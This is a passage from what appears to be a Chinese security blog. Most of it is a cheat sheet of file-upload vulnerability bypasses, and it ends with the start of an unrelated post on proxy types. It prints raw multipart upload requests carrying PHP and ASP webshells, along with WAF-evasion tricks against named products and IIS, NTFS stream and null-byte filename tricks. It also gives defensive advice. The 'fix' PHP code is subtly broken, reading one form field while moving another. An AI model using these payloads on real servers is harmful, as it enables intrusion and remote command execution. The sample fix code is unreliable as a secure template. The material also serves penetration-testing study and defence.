<h3 id="1-1-客户端校验"><a href="#1-1-客户端校验" class="headerlink" title="1.1 客户端校验"></a>1.1 客户端校验</h3><p>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。</p>
<p>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>
<h3 id="1-2-服务端校验"><a href="#1-2-服务端校验" class="headerlink" title="1.2 服务端校验"></a>1.2 服务端校验</h3><p><strong>1.2.1 content-type字段校验</strong></p>
<p>这里以PHP代码为例，模拟web服务器端的校验代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)  <span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></span><br><span class="line">        &#123;   </span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">         <span class="keyword">exit</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    $uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">    $uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>],$uploadfile))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>
<p><strong>1.2.2 文件内容头校验</strong></p>
<p>可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：</p>
<ul>
<li>.JPEG;.JPE;.JPG，”JPGGraphic File”</li>
<li>.gif，”GIF 89A”</li>
<li>.zip，”Zip Compressed”</li>
<li>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>
</ul>
<h2 id="0x02-文件上传绕过校验姿势"><a href="#0x02-文件上传绕过校验姿势" class="headerlink" title="0x02 文件上传绕过校验姿势"></a>0x02 文件上传绕过校验姿势</h2><ul>
<li>客户端绕过（抓包改包）</li>
<li>服务端绕过<ul>
<li>文件类型</li>
<li>文件头</li>
<li>文件后缀名</li>
</ul>
</li>
<li>HTTP不安全方法(PUT方法)</li>
<li>配合文件包含漏洞绕过</li>
<li>配合服务器解析漏洞绕过</li>
<li>CMS、编辑器漏洞绕过</li>
<li>配合操作系统文件命名规则绕过</li>
<li>配合其他规则绕过</li>
<li>WAF绕过</li>
</ul>
<h3 id="2-1-客户端绕过"><a href="#2-1-客户端绕过" class="headerlink" title="2.1 客户端绕过"></a>2.1 客户端绕过</h3><p>可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
<h3 id="2-2-服务端绕过"><a href="#2-2-服务端绕过" class="headerlink" title="2.2 服务端绕过"></a>2.2 服务端绕过</h3><p><strong>2.2.1 文件类型绕过</strong></p>
<p>我们可以通过抓包，将content-type字段改为image/gif</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="regexp">/upload.php HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">TE:</span> deflate,gzip;q=<span class="number">0.3</span></span><br><span class="line"><span class="string">Connection:</span> TE, close</span><br><span class="line"><span class="string">Host:</span> localhost</span><br><span class="line">User-<span class="string">Agent:</span> libwww-perl/<span class="number">5.803</span></span><br><span class="line">Content-<span class="string">Type:</span> multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">155</span></span><br><span class="line">--xYzZY</span><br><span class="line">Content-<span class="string">Disposition:</span> form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span></span><br><span class="line">Content-<span class="string">Type:</span> image<span class="regexp">/gif (原为 Content-Type: text/</span>plain)</span><br><span class="line">&lt;?php system($_GET['command']);?&gt;</span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure>
<p><strong>2.2.2 文件头绕过</strong></p>
<p>在木马内容基础上再加了一些文件信息，有点像下面的结构</p>
<p><code>GIF89a&lt;?php phpinfo(); ?&gt;</code></p>
<p>或构造图片吗，将恶意文本写入图片的二进制代码，避免破坏图片文件头和尾</p>
<p><code>copy xx.jpg/b + yy.txt/a xy.jpg</code></p>
<ul>
<li><p>/b 即二进制[binary]模式</p>
</li>
<li><p>/a 即ascii模式 xx.jpg正常图片文件 </p>
</li>
</ul>
<p><strong>2.2.3 文件后缀名绕过</strong></p>
<p>前提：黑名单校验</p>
<p>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。</p>
<p>绕过方法：</p>
<ul>
<li>找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类</li>
<li>可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</li>
</ul>
<p>能被解析的文件扩展名列表：</p>
<ul>
<li>jsp jspx jspf</li>
<li>asp asa cer aspx</li>
<li>php php php3 php4</li>
<li>exe exee</li>
</ul>
<h3 id="2-3-配合文件包含漏洞"><a href="#2-3-配合文件包含漏洞" class="headerlink" title="2.3 配合文件包含漏洞"></a>2.3 配合文件包含漏洞</h3><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p>
<p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p>
<ul>
<li>先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</li>
<li>然后再上传一个.php的文件，内容为<code>&lt;?php Include(“上传的txt文件路径”);?&gt;</code></li>
</ul>
<p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p>
<figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">#PHP    </span></span><br><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(<span class="string">"上传的txt文件路径"</span>);<span class="meta">?&gt;</span></span> </span></span><br><span class="line"><span class="xml">#ASP    </span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--#include file="上传的txt文件路径" --&gt;</span></span></span><br><span class="line"><span class="xml">#JSP    </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">jsp:inclde</span> <span class="attr">page</span>=<span class="string">"上传的txt文件路径"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">or  </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@include file=<span class="string">"上传的txt文件路径"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br></pre></td></tr></table></figure>
<h3 id="2-4-配合文件解析漏洞"><a href="#2-4-配合文件解析漏洞" class="headerlink" title="2.4 配合文件解析漏洞"></a>2.4 配合文件解析漏洞</h3><h3 id="2-5-配合操作系统文件命名规则"><a href="#2-5-配合操作系统文件命名规则" class="headerlink" title="2.5 配合操作系统文件命名规则"></a>2.5 配合操作系统文件命名规则</h3><ol>
<li><p>上传不符合windows文件命名规则的文件名</p>
<ul>
<li>test.asp.</li>
<li>test.asp(空格)</li>
<li>test.php:1.jpg</li>
<li>test.php::$DATA</li>
<li><p>shell.php::$DATA…….</p>
<p>会被windows系统自动去掉不符合规则符号后面的内容。</p>
</li>
</ul>
</li>
<li><p>linux下后缀名大小写</p>
<p> 在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
</li>
</ol>
<h3 id="2-6-CMS、编辑器漏洞"><a href="#2-6-CMS、编辑器漏洞" class="headerlink" title="2.6 CMS、编辑器漏洞"></a>2.6 CMS、编辑器漏洞</h3><ol>
<li>CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</li>
<li>编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。</li>
</ol>
<h3 id="2-7-配合其他规则"><a href="#2-7-配合其他规则" class="headerlink" title="2.7 配合其他规则"></a>2.7 配合其他规则</h3><p>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p>
<ul>
<li>test.php(0x00).jpg</li>
<li>test.php%00.jpg</li>
<li>路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</li>
</ul>
<p>伪代码演示：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name= getname(httprequest) <span class="comment">//假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</span></span><br><span class="line">type =gettype(name)        <span class="comment">//而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</span></span><br><span class="line"><span class="keyword">if</span>(type == jpg)</span><br><span class="line">   SaveFileToPath(UploadPath.name, name)   <span class="comment">//但在这里却是以 0x00 作为文件名截断</span></span><br><span class="line"><span class="comment">//最后以 help.asp 存入路径里</span></span><br></pre></td></tr></table></figure></p>
<h3 id="2-8-WAF绕过"><a href="#2-8-WAF绕过" class="headerlink" title="2.8 WAF绕过"></a>2.8 WAF绕过</h3><p><strong>2.8.1 垃圾数据</strong></p>
<p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p>
<p>可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p>
<p>也可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/<span class="number">1.1</span></span><br><span class="line">TE: deflate,gzip;q=<span class="number">0.3</span></span><br><span class="line">Connection: TE, close</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: libwww-perl/<span class="number">5.803</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-Length: <span class="number">155</span></span><br><span class="line"><span class="comment">/////////可以在这里添加a=11111111111....</span></span><br><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span>;<span class="comment">/////////可以在这里添加a=11111111111....</span></span><br><span class="line">Content-Type: image/gif</span><br><span class="line"><span class="comment">/////////可以在这里添加a=11111111111....</span></span><br><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'command'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure>
<p><strong>2.8.2 filename</strong></p>
<p>针对早期版本安全狗，可以多加一个filename</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.jpg"</span>;filename=<span class="string">"shell.php"</span> <span class="comment">//多加一个filename</span></span><br><span class="line">Content-Type: image/gif</span><br><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'command'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure>
<p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"userfile"</span></span><br><span class="line">Content-Type: image/gif</span><br><span class="line">filename=<span class="string">"shell.php"</span>  <span class="comment">//把filemane放这里</span></span><br><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'command'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure>
<p><strong>2.8.3 POTS/GET</strong></p>
<p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。</p>
<p>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
<p><strong>2.8.4 利用waf本身缺陷</strong></p>
<ul>
<li>删除实体里面的Conten-Type字段</li>
</ul>
<p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正常包：Content-Disposition: form-data; name=<span class="string">"image"</span>; filename=<span class="string">"085733uykwusqcs8vw8wky.png"</span>Content-Type: image/png</span><br><span class="line">构造包：Content-Disposition: form-data; name=<span class="string">"image"</span>; filename=<span class="string">"085733uykwusqcs8vw8wky.png</span></span><br><span class="line"><span class="string">C.php"</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>删除Content-Disposition字段里的空格</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition:<span class="comment">/*这里空格删除*/</span>form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>增加一个空格导致安全狗被绕过案列：</p>
</li>
</ul>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Content</span>-Type: <span class="keyword">multipart/form-data; </span><span class="keyword">boundary=—————————4714631421141173021852555099</span></span><br><span class="line"><span class="keyword">尝试在boundary后面加个空格或者其他可被正常处理的字符：</span></span><br><span class="line"><span class="keyword">boundary= </span>—————————<span class="number">47146314211411730218525550</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>修改Content-Disposition字段值的大小写</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; <span class="attribute">nAme</span>=<span class="string">"userfile"</span>; <span class="attribute">filename</span>=<span class="string">"shell.php"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Boundary边界不一致</p>
</li>
</ul>
<p>每次文件上传时的Boundary边界都是一致的：</p>
<p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：</p>
<p>Win2k3 + IIS6.0 + ASP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=--------------------------<span class="number">-471463142114117302185255</span>dddd <span class="comment">//修改</span></span><br><span class="line">Content-Length: <span class="number">253</span></span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.asp"</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">"a"</span>)%&gt;</span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span>--</span><br></pre></td></tr></table></figure>
<ul>
<li><p>文件名回车</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.ph</span></span><br><span class="line"><span class="string">p"</span> <span class="comment">//php中间回车</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>多个Content-Disposition</p>
</li>
</ul>
<p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过</p>
<p>Win2k8 + IIS7.0 + PHP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=--------------------------<span class="number">-4714631421141173021852555099</span> </span><br><span class="line">Content-Length: <span class="number">253</span></span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.php"</span></span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.jpg"</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">"a"</span>)%&gt;</span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span>--</span><br></pre></td></tr></table></figure>
<ul>
<li>利用NTFS ADS 特性</li>
</ul>
<p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</p>
<table>
<thead>
<tr>
<th>上传的文件名</th>
<th>服务器表面现象</th>
<th>生成的文件内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>Test.php:a.jpg</td>
<td>生成Test.php</td>
<td>空</td>
</tr>
<tr>
<td>Test.php::$DATA</td>
<td>生成test.php</td>
<td>\&lt;?php phpinfo();?&gt;</td>
</tr>
<tr>
<td>Test.php::$INDEX_ALLOCATION</td>
<td>生成test.php文件夹</td>
<td></td>
</tr>
<tr>
<td>Test.php::$DATA.jpg</td>
<td>生成0.jgp</td>
<td>\&lt;?php phpinfo();?&gt;</td>
</tr>
<tr>
<td>Test.php::$DATA\aaa.jpg</td>
<td>生成aaa.jpg</td>
<td>\&lt;?php phpinfo();?&gt;</td>
</tr>
</tbody>
</table>
<ul>
<li>文件重命名绕过</li>
</ul>
<p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell...............................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">............................................php"</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>特殊的长文件名绕过</li>
</ul>
<p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">shell</span><span class="selector-class">.asp</span>;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王<span class="selector-class">.jpg</span></span><br></pre></td></tr></table></figure></p>
<p><strong>2.8.5</strong> 其他绕过</p>
<p>如服务器解析漏洞、文件包含漏洞等尝试绕过</p>
<h3 id="2-9-HTTP不安全方法"><a href="#2-9-HTTP不安全方法" class="headerlink" title="2.9 HTTP不安全方法"></a>2.9 HTTP不安全方法</h3><p> 当服务器配置不当时，在不需要的上传页面的情况下导致任意文件上传（PUT协议） </p>
<h2 id="0x03-文件校验的几点建议"><a href="#0x03-文件校验的几点建议" class="headerlink" title="0x03 文件校验的几点建议"></a>0x03 文件校验的几点建议</h2><ul>
<li>上传文件的存储目录禁用执行权限</li>
<li>文件扩展名服务端白名单校验，注意0x00截断攻击 </li>
<li>文件内容服务端校验。</li>
<li>上传文件重命名。</li>
<li>隐藏上传文件路径。</li>
</ul>
<p>以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。 </p>
<h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>php修复代码参考</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getExt</span> <span class="params">($filename)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> substr ($filename,strripos($filename,<span class="string">'.'</span>)+<span class="number">1</span>);    <span class="comment">//substr()函数返回字符串的一部分，strripos() 函数查找字符串从左到右在另一字符串中最后一次出现的位置  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    $disallowed_types = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);  </span><br><span class="line">  </span><br><span class="line">    $FilenameExt = strtolower(getExt($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));     <span class="comment">//获取文件扩展名strtolower()将扩展名字符转换小写  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//判断是否在允许的扩展名里  </span></span><br><span class="line"><span class="keyword">if</span> (!in_array($FilenameExt, $disallowed_types)) &#123;            <span class="comment">//如果获取文件扩展名不在白名单数组里，则返回disallowed type。  </span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"disallowed type"</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">else</span> &#123;  </span><br><span class="line">      </span><br><span class="line"><span class="comment">//文件名用time()函数获得10进制时间戳命名，在1-10000之间随机一个常数，防止同一秒不同用户上传文件重复，并最终用md5函数生成哈希散列命名文件。  </span></span><br><span class="line">     $filename = md5(time()+rand (<span class="number">1</span>,<span class="number">10000</span>)).<span class="string">"."</span>.$FilenameExt;         </span><br><span class="line">  </span><br><span class="line">    move_uploaded_file ($_FILES[<span class="string">"upfile"</span>][<span class="string">"tmp_name"</span>], <span class="string">"upload/"</span> . $filename);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'文件上传成功，保存于：upload/'</span> . $filename . <span class="string">"\n"</span>;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
      

    </div>





    <footer class="article-footer">
      
        <a data-url="https://www.pa55w0rd.club/pa55w0rd-new.github.io/fileupload/" data-id="cjoo67ggw0028dxt6z06kupns" class="article-share-link" data-share="baidu" data-title="文件上传漏洞总结">分享到</a>
      

      
        <a href="https://www.pa55w0rd.club/pa55w0rd-new.github.io/fileupload/#gitalk-container" class="article-comment-link">评论</a>
      

      

    </footer>
  </div>
  
</article>









  
    <article id="post-代理" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
    <a href="/pa55w0rd-new.github.io/代理/" class="article-date">
  <i class="fa fa-calendar"></i>
  <time datetime="2018-10-19T09:23:03.000Z" itemprop="datePublished">2018-10-19</time>
</a>

    
  <div class="article-category">
    <a class="article-category-link" href="/pa55w0rd-new.github.io/categories/note/">note</a>
  </div>


  </div>
  <div class="article-inner">
    
    

      <header class="article-header">

        
  
    <h1 itemprop="name">
      <a class="article-title" href="/pa55w0rd-new.github.io/代理/">
        <i class="fa fa-pencil-square-o  article-title-icon"></i>代理</a>
    </h1>
  



      </header>
    
    <div class="article-entry" itemprop="articleBody">
      

        <br>
        <span id="busuanzi_container_page_pv">
          阅读次数<span id="busuanzi_value_page_pv"></span>
        </span>
        <ul>
<li>目录<br>{:toc}</li>
</ul>
<h2 id="正向代理-ForwardProxy"><a href="#正向代理-ForwardProxy" class="headerlink" title="正向代理 [ ForwardProxy ]"></a>正向代理 [ ForwardProxy ]</h2><p>大家默认所说的代理其实都是指正向代理,不管是正向还是反向,理解数据的流向很重要,要理解这种比较抽象的东西最好的方式就是画图,比如下图就是一个正向代理的简易工作流程图,要表达的意思,已经很清晰了,就是说 <strong>当客户端要去请求远程server上的资源时,并非直接通过本地路由网关到达远程server,而是先经过代理服务器,由代理服务器去帮我们请求,之后远程服务器会把请求的结果返回给代理服务器再由代理服务器返回给客户端</strong> ,这么一个过程就叫正向代理,其实你还可以理解的更简单粗暴一点,它有点儿类似我们常说的 ‘翻墙’,正常情况我自己是不能直接上谷歌的,但我找了一个能上谷歌的代理,然后我们请求谷歌的时候可以让代理服务器去帮我们请求,最后,再通过代理服务器把响应的数据返回到我本地,就这么一个过程,不过现在正向代理可能用的比较少了,以前用代理服务器只是为了提高访问速度[因为缓存的原因],可以节省带宽,也可以在代理服务器上做些访问控制……</p>
<p><img src="\assets\img\proxy\1.png" alt=""></p>
<h2 id="反向代理-reverseproxy"><a href="#反向代理-reverseproxy" class="headerlink" title="反向代理 [ reverseproxy ]"></a>反向代理 [ reverseproxy ]</h2><p>至于反向代理,就更容易理解了,数据流向完全相反,还是看这张图,来自客户端的请求会首先到达代理服务器而非真实的server,至于客户端的请求最终会被送到哪个后端服务器上去处理,客户端是完全看不到的,这也在一定程度上隐藏了后端的真实server</p>
<p><img src="\assets\img\proxy\2.png" alt=""></p>
<h2 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h2><p>很显然,透明的意思就是你感受不到代理服务器的存在,但流量却又真正被代理服务器所左右,也就是说,我们并不需要知道代理服务器,比如,我可以用这种方式来限制你访问某些资源等等……它跟正向代理非常的像,其实也属于正向代理的一种,只不过正向代理能看见,但这个看不到</p>
<h2 id="匿名代理"><a href="#匿名代理" class="headerlink" title="匿名代理"></a>匿名代理</h2><ul>
<li><p>高度匿名代理<br>  这样的服务器会把你的数据包原封不动的来转发,就好像自己的一样,这样对目标站来讲,根本就不会以为是代理服务器在访问它而不是你</p>
</li>
<li><p>普通匿名代理<br>  相对于高度匿名代理来讲,这样的服务器会被目标站认出来是代理服务器,从而很有可能还是会追踪到你的真实IP</p>
</li>
</ul>
<h2 id="负载均衡-Loadbalancing"><a href="#负载均衡-Loadbalancing" class="headerlink" title="负载均衡 [ Loadbalancing ]"></a>负载均衡 [ Loadbalancing ]</h2><p>负载均衡主要用在高并发的场景中,也就是代理服务器可能有很多台,有可能是个代理服务器集群,来自四面八方的请求会被代理服务器分发到后端各个服务器上去处理,至于具体要被分发到后端哪一台服务器上去处理,则由其内部的负载均衡算法决定,比如典型的 nginx七层负载均衡,以及各种硬件负载均衡器,比如像 f5 这种东西,等等……</p>
<p>网站的负载均衡可以从DNS和HTTP两个环节进行实施</p>
